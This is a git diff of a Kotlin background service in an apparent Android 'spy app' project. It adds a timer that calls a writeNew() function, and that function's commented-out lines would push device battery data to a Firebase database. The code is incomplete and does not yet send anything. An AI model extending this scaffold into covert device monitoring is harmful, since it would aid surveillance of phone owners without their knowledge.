@@ -4,15 +4,20 @@ import android.app.Service
 import android.content.Intent
 import android.os.IBinder
 import android.util.Log
+import com.komnacki.androidspyapp.MainActivity.Companion.mFirebaseDatabaseReference
+import github.nisrulz.easydeviceinfo.base.EasyBatteryMod
+import github.nisrulz.easydeviceinfo.base.EasyConfigMod
 import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
 import io.reactivex.rxjava3.core.Observable
 import io.reactivex.rxjava3.disposables.Disposable
 import io.reactivex.rxjava3.schedulers.Schedulers
 import java.util.concurrent.TimeUnit
 
+
 class MainService : Service() {
     private lateinit var s: Disposable
     private var timer: Long = 0
+    private lateinit var easyConfigMod : EasyConfigMod;
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val returnVal = super.onStartCommand(intent, flags, startId)
@@ -43,6 +48,7 @@ class MainService : Service() {
 
     override fun onCreate() {
         super.onCreate()
+//        easyConfigMod = EasyConfigMod(this)
         Log.d("SERVICE: ", "on create()")
         doWork()
     }
@@ -53,9 +59,18 @@ class MainService : Service() {
             .observeOn(AndroidSchedulers.mainThread())
             .subscribe { action ->
                 timer = action
+                if(timer%10 == 0L) {
+                    writeNew(easyConfigMod.formattedTime)
+                }
                 Log.d("SERVICE COUNTER: ", action.toString())
             }
-        Log.d("SERVICE: ", "do work!!!")
+    }
+
+    private fun writeNew(id: String) {
+//        val easyBatteryMod = EasyBatteryMod(this)
+//        val message = Message(easyBatteryMod.batteryPercentage.toString())
+//        mFirebaseDatabaseReference.child("test1").child(id).child("asd").setValue(message)
+//        mFirebaseDatabaseReference.child("test1").child(id).child("asd").child("qwe").setValue(message)
     }
 
     override fun onDestroy() {
